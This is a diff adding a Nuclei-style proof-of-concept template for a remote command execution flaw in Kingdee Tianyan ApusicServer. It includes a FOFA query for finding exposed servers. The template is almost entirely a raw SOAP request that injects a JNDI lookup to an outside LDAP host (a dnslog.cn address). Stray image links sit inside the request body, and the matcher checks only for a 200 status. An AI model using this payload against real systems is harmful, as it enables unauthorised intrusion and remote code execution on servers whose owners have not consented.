@@ -1,0 +1,19 @@
+id: poc-yy75fhv67bwkpu63
+info:
+  name: 金蝶天燕ApusicServer servicefactoryservice 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yy75fhv67bwkpu63'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yy75fhv67bwkpu63
+    fofa: header="Apusic"
+http:
+- raw:
+  - "POST /ormrpc/services/ServiceFactoryService HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: EASSESSIONID=1991346249; NAPRoutID=1991346249\nConnection: close\nContent-Type: application/xml\nSoapaction: something\nContent-Length: 732\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:buil=\"http://build.antlr\">\n<soapenv:Header/>\n<soapenv:Body>\n\t<buil:getService soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n\t<environment xmlns:apachesoap=\"http://xml.apache.org/xml-soap\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\" xsi:type=\"apachesoap:Map\">\n\t\t<item>\n\t\t<key xsi:type=\"soapenc:string\">jndiName</key>\n\t\t<value xsi:type=\"soapenc:string\">ldap://a5skg4.dnslog.cn</value>\n\t\t</item>\n\t</environment>\n\t</buil:getService>\n</soapenv:Body>\n</soapenv:Envelope>\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077438703-3d58f3ec-1d6b-4e98-b8c1-678c4add47b1.png)\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077438962-11a04663-1b46-42a7-bbbf-05017da1d216.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
